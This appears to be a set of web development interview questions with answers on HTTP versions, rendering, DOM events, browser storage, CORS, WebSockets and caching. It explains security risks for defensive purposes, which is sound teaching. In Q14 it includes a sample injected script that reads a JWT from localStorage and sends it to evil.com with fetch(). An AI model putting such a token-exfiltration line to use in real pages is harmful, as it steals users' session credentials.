# Web Development Interview Questions

A curated collection of web development interview questions covering browser architecture, DOM, storage, CORS, WebSockets, and HTTP fundamentals. Each question includes a detailed answer.

## HTTP Fundamentals

### Q1: What happens when you type a URL in the browser?

This is a classic "full stack" question that tests breadth of knowledge:

1. **URL parsing** — browser parses the URL into protocol, host, port, path, query, and fragment
2. **DNS resolution** — browser checks cache (browser → OS → router → ISP), then performs recursive DNS lookup through root → TLD → authoritative nameserver
3. **TCP connection** — three-way handshake (SYN → SYN-ACK → ACK) to the server's IP on port 443 (HTTPS) or 80 (HTTP)
4. **TLS handshake** (HTTPS) — negotiate cipher suite, verify certificate, establish encryption
5. **HTTP request** — send the HTTP request with headers
6. **Server processing** — server processes the request, generates response
7. **HTTP response** — receive status code, headers, and body
8. **Rendering** — browser parses HTML, builds DOM, parses CSS, builds CSSOM, creates render tree, layout, paint
9. **Sub-resources** — browser discovers and fetches CSS, JS, images, fonts in parallel

### Q2: What's the difference between HTTP/1.1, HTTP/2, and HTTP/3?

**HTTP/1.1:**
- Text-based protocol
- One request at a time per connection (pipelining rarely implemented)
- No header compression
- Browsers open 6-8 connections per domain as a workaround

**HTTP/2:**
- Binary framing protocol
- Multiplexing — multiple requests/responses over one TCP connection
- HPACK header compression
- Server push (now deprecated)
- Still over TCP, so TCP head-of-line blocking remains

**HTTP/3:**
- Uses QUIC over UDP instead of TCP
- Eliminates TCP head-of-line blocking (stream-level independence)
- Built-in TLS 1.3 (mandatory encryption)
- 0-RTT connection establishment for known servers
- Connection migration survives IP changes

### Q3: What's the difference between PUT and PATCH?

**PUT** replaces the entire resource. You must send the complete representation:

```
PUT /users/1
{"name": "John", "email": "john@example.com", "age": 30}
```

**PATCH** partially updates a resource. You send only the fields to change:

```
PATCH /users/1
{"email": "newemail@example.com"}
```

PUT is idempotent (same result no matter how many times you call it). PATCH may or may not be idempotent depending on implementation.

### Q4: When would you use 301 vs 307 redirects?

**301 (Moved Permanently):**
- Resource has permanently moved to a new URL
- Browsers may cache the redirect
- ⚠️ Some clients change POST to GET (browser behavior)

**307 (Temporary Redirect):**
- Temporary redirect
- **Preserves the HTTP method** (POST stays POST)
- Use when you need to redirect a POST request without changing it to GET

**308 (Permanent Redirect):**
- Like 301 but **preserves the HTTP method**
- Added in RFC 7538 to fix the 301 POST→GET issue

### Q5: Explain ETag and conditional requests.

An **ETag** (Entity Tag) is a unique identifier for a specific version of a resource:

```
# Server sends ETag with response
HTTP/1.1 200 OK
ETag: "abc123"
Content: ...

# Client makes conditional request
GET /resource HTTP/1.1
If-None-Match: "abc123"

# If unchanged
HTTP/1.1 304 Not Modified
(saves bandwidth — no body sent)

# If changed
HTTP/1.1 200 OK
ETag: "def456"
Content: (new version)
```

This enables **conditional requests** — the client only downloads the full resource if it has changed, saving bandwidth and improving performance.

### Q6: What is the `Vary` header used for?

The `Vary` header tells caches which request headers affect the response:

```
Vary: Accept-Encoding, Accept-Language
```

This means: "cache two versions of this response — one for `Accept-Encoding: gzip` and one for `Accept-Encoding: br`". Without `Vary`, a CDN might serve a gzip response to a client that supports Brotli.

## Browser Architecture

### Q7: Explain the critical rendering path.

The Critical Rendering Path (CRP) is the sequence of steps from receiving HTML to rendering pixels:

1. **Parse HTML → DOM** — tokenization, tree construction
2. **Parse CSS → CSSOM** — cascade resolution
3. **DOM + CSSOM → Render Tree** — only visible elements
4. **Layout** — calculate geometry (positions and sizes)
5. **Paint** — generate pixels

**CSS is render-blocking** — the browser won't paint until the CSSOM is built. **JS is parser-blocking** — the browser pauses HTML parsing to download and execute scripts.

**Optimizations:**
- Inline critical CSS
- Use `async`/`defer` for scripts
- Preload critical resources
- Minimize CSS and JS file sizes

### Q8: What's the difference between reflow and repaint?

**Reflow (Layout):**
- Recalculates positions and dimensions of elements
- Triggered by DOM changes, style changes (width, height, margin), content changes, window resize
- Expensive — can affect the entire document
- A parent reflow triggers child reflows

**Repaint:**
- Redraws visual styles without changing layout
- Triggered by color, background, visibility, shadow changes
- Cheaper than reflow

**Optimization:** Use `transform` and `opacity` for animations — they bypass both layout and paint, running on the compositor thread.

### Q9: What is layout thrashing and how do you prevent it?

Layout thrashing occurs when JavaScript repeatedly forces the browser to recalculate layout by interleaving reads and writes:

```javascript
// BAD — each iteration triggers a layout
for (const el of elements) {
  const height = el.offsetHeight; // READ — forces layout
  el.style.height = height * 2 + 'px'; // WRITE
}

// GOOD — batch reads, then batch writes
const heights = elements.map(el => el.offsetHeight); // all reads
elements.forEach((el, i) => {
  el.style.height = heights[i] * 2 + 'px'; // all writes
});
```

Reading layout properties (`offsetHeight`, `offsetWidth`, `getComputedStyle()`) forces a synchronous layout calculation. If you do this in a loop with writes in between, the browser recalculates layout on every iteration.

## DOM

### Q10: Explain event propagation — bubbling vs capturing.

Events propagate in three phases:

1. **Capture** — event travels from `window` down to the target
2. **Target** — event reaches the target element
3. **Bubbling** — event travels back up from target to `window`

```javascript
element.addEventListener('click', handler, { capture: true }); // capture phase
element.addEventListener('click', handler);                     // bubbling phase (default)
element.addEventListener('click', handler, { once: true });     // fires once
```

`event.stopPropagation()` stops further propagation. `event.preventDefault()` prevents the default action (e.g., form submission, link navigation).

### Q11: What is event delegation and why use it?

Event delegation attaches a single listener to a parent instead of individual listeners to children:

```javascript
// Instead of
document.querySelectorAll('li').forEach(li => {
  li.addEventListener('click', handleClick);
});

// Use delegation
document.querySelector('ul').addEventListener('click', (e) => {
  const li = e.target.closest('li');
  if (!li) return;
  handleClick(e);
});
```

**Benefits:**
- Fewer event listeners (better memory, fewer registrations)
- Automatically handles dynamically added elements
- Easier cleanup (one listener to remove)

Use `e.target.closest(selector)` to handle clicks on child elements within the target.

### Q12: What's the difference between `event.target` and `event.currentTarget`?

- `event.target` — the element that **triggered** the event (the actual element clicked)
- `event.currentTarget` — the element that the **listener is attached to**

```html
<ul id="list">
  <li id="item"><span>Text</span></li>
</ul>
```

```javascript
document.getElementById('list').addEventListener('click', (e) => {
  // Click on span:
  e.target;        // <span>Text</span> (what was actually clicked)
  e.currentTarget; // <ul id="list"> (what the listener is on)
});
```

## Storage

### Q13: Compare cookies, localStorage, sessionStorage, and IndexedDB.

| Feature | Cookies | localStorage | sessionStorage | IndexedDB |
|---------|---------|-------------|----------------|-----------|
| Size | ~4KB | 5-10MB | 5-10MB | Hundreds of MB+ |
| Persistence | Configurable | Forever | Tab close | Forever |
| Sent to server | Yes | No | No | No |
| API | String | String key-value | String key-value | Structured, async |
| Security | HttpOnly flag | XSS vulnerable | XSS vulnerable | XSS vulnerable |

**Use cookies for** — authentication tokens (with HttpOnly, Secure, SameSite)
**Use localStorage for** — user preferences, non-sensitive persistent data
**Use sessionStorage for** — temporary tab-specific state
**Use IndexedDB for** — large data, binary data, offline-first apps

### Q14: Why shouldn't you store JWTs in localStorage?

`localStorage` is accessible to any JavaScript running on the page. If an attacker can inject script (XSS vulnerability), they can steal the token:

```javascript
// Attacker's injected script
const token = localStorage.getItem('jwt');
fetch('https://evil.com/steal?token=' + token);
```

**Better approach:** Store JWTs in `HttpOnly`, `Secure`, `SameSite=Lax` cookies. JavaScript can't access HttpOnly cookies, so XSS attacks can't steal the token. The cookie is automatically sent with requests.

Trade-off: Cookies are vulnerable to CSRF, but `SameSite=Lax` mitigates this effectively.

### Q15: How do you sync state across browser tabs?

Several approaches:

1. **localStorage `storage` event** — fires in other tabs when localStorage changes:
```javascript
window.addEventListener('storage', (e) => {
  if (e.key === 'theme') updateTheme(e.newValue);
});
```

2. **BroadcastChannel API** — direct cross-tab communication:
```javascript
const channel = new BroadcastChannel('app');
channel.postMessage({ type: 'logout' });
channel.onmessage = (e) => console.log(e.data);
```

3. **SharedWorker** — a worker shared across tabs from the same origin

4. **Service Worker** — post messages through a service worker

## CORS

### Q16: What is CORS and why does it exist?

CORS (Cross-Origin Resource Sharing) is a mechanism that relaxes the same-origin policy in a controlled way. The same-origin policy prevents JavaScript from reading responses from different origins — CORS lets servers explicitly allow specific origins.

Without CORS, `fetch('https://api.other.com/data')` would fail. With CORS, the server sends `Access-Control-Allow-Origin: https://myapp.com` to grant access.

### Q17: What is a preflight request?

A preflight request is an `OPTIONS` request the browser sends before the actual request when:

- The method is not GET, HEAD, or POST
- The request has non-simple headers (Authorization, custom headers)
- The Content-Type is not form-urlencoded, multipart, or text/plain

The preflight asks the server "is this cross-origin request allowed?" If the server responds with appropriate `Access-Control-*` headers, the browser sends the actual request.

### Q18: Why can't `Access-Control-Allow-Origin` be `*` with credentials?

The `*` wildcard means "any origin." With credentials (cookies, auth headers), this would allow any website to make authenticated requests on behalf of the user — a severe security issue.

Instead, the server must specify the exact origin:
```
Access-Control-Allow-Origin: https://myapp.com
Access-Control-Allow-Credentials: true
```

## WebSockets

### Q19: How do WebSockets differ from HTTP?

**HTTP:**
- Request-response model (client always initiates)
- Stateless — each request is independent
- New connection or keep-alive per request
- High overhead per message (full headers)

**WebSockets:**
- Full-duplex (either side can send messages)
- Persistent connection (established once, kept open)
- Low overhead per message (2-14 bytes framing)
- Server can push data without client request

The connection starts as HTTP (upgrade handshake), then switches to the WebSocket protocol.

### Q20: How do you handle WebSocket authentication?

WebSockets don't support custom headers in the browser API. Common approaches:

1. **Token in URL:** `wss://example.com/ws?token=abc` (use HTTPS to encrypt)
2. **Cookie-based:** cookies are sent with the upgrade request
3. **First message:** connect, then send credentials as the first message

```javascript
// Server verifies during upgrade
wss.on('upgrade', (request, socket, head) => {
  const token = new URL(request.url, 'http://localhost').searchParams.get('token');
  if (!verifyToken(token)) {
    socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
    socket.destroy();
  }
});
```

### Q21: When would you use SSE over WebSockets?

Use SSE when:
- Communication is **server-to-client only** (no client-to-server messages needed)
- You want **automatic reconnection** built in
- You need **text-based** events (no binary data)
- You want **simpler** infrastructure (works with standard HTTP load balancers)
- You need **event types** and **last-event IDs** for resumability

Use WebSockets when:
- You need **bidirectional** communication
- You need **binary data** transfer
- You need the **lowest possible latency**
- You're building **chat, gaming, or collaborative editing**

## Mixed / Advanced Questions

### Q22: Explain the difference between `async` and `defer` script attributes.

Both download scripts in parallel with HTML parsing, but differ in execution timing:

- **`async`** — executes as soon as downloaded, **pausing HTML parsing**. Execution order is not guaranteed (whichever downloads first executes first)
- **`defer`** — executes **after HTML parsing is complete**, in document order

```
HTML Parsing: ──────────────────────────────>
async download:      ────▶ execute (pause parsing)
defer download:      ────▶         execute (after parsing)
regular <script>:    ────▶ download + execute (blocks parsing)
```

**Use `defer`** for most scripts (maintains order). **Use `async`** for independent scripts (analytics, ads). **Modules** (`type="module"`) are deferred by default.

### Q23: What is the `Content-Security-Policy` header?

CSP is a security header that prevents XSS and other injection attacks by controlling which resources the browser is allowed to load:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; style-src 'self' 'unsafe-inline'; img-src * data:; connect-src 'self' https://api.example.com
```

Key directives:
- `default-src` — fallback for other directives
- `script-src` — allowed script sources
- `style-src` — allowed CSS sources
- `img-src` — allowed image sources
- `connect-src` — allowed fetch/XHR/WebSocket endpoints
- `report-uri` / `report-to` — where to send violation reports

CSP prevents inline scripts (unless `'unsafe-inline'` or nonces are used), blocking most XSS attacks.

### Q24: What is HTTP/2 multiplexing and why does it matter?

Multiplexing allows multiple requests and responses to be in-flight simultaneously over a single TCP connection, with data interleaved at the frame level:

**HTTP/1.1:** Requests are serialized. A slow response blocks all others (head-of-line blocking). Browsers open 6-8 connections as a workaround.

**HTTP/2:** One connection carries all requests. Frames from different streams are interleaved. A slow response doesn't block others.

This eliminates the need for domain sharding, concatenation, and spriting — optimizations that were necessary under HTTP/1.1.

### Q25: How does the browser determine caching behavior?

The browser follows this decision tree:

1. **Check cache** — is the resource in cache?
2. **Check freshness** — is `max-age` or `Expires` still valid?
   - If fresh → use cached version (200 from cache)
   - If stale → send conditional request (`If-None-Match` / `If-Modified-Since`)
3. **Conditional request** — server responds:
   - `304 Not Modified` → use cached version
   - `200 OK` → update cache with new version
4. **No cache entry** → fetch normally

`Cache-Control: no-cache` doesn't mean "don't cache" — it means "always revalidate before using cache." `Cache-Control: no-store` means "don't cache at all."
